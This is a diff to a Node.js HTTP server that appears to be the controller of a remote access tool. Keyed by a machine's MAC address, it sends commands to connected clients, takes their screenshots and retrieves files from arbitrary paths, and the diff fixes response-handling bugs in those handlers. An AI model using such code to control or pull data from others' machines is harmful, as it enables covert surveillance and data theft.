@@ -124,8 +124,8 @@ const httpServer = http.createServer((req, res) => {
                     }, false, handleError);
                 } else if (typeof query['psl'] !== "undefined") {
                     clients[query['mac']].setCommand(query['psl'], result => {
-                        res.end(result['result']);
                         res.writeHead(200, {'Content-Type': 'text/plain'});
+                        res.end(result['result']);
                     }, true, handleError);
                 } else if (typeof query['screenshot'] !== "undefined") {
                     clients[query['mac']].takeScreenshot(result => {
@@ -134,14 +134,16 @@ const httpServer = http.createServer((req, res) => {
                     }, handleError);
                 } else if (typeof query['path'] !== "undefined") {
                     clients[query['mac']].getFile(query["path"], result => {
-                        res.writeHead(200, {
+                        /*res.writeHead(200, {
                             'Content-Type': 'application/octet-stream',
                             'Content-Disposition': `attachment; filename=${(() => {
                                 let arr = query['path'].split(/[\\/]/);
                                 return arr[arr.length - 1];
                             })()}`
-                        });
-                        res.end(Buffer.from(result['base64'], 'base64'));
+                        });*/
+                        res.writeHead(200, {'Content-Type': 'text/plain'});
+                        //res.end(Buffer.from(result['base64'], 'base64'));
+                        res.end(result['base64'], 'base64');
                     }, handleError);
                 } else {
                     res.writeHead(403, {'Content-Type': 'text/html'});
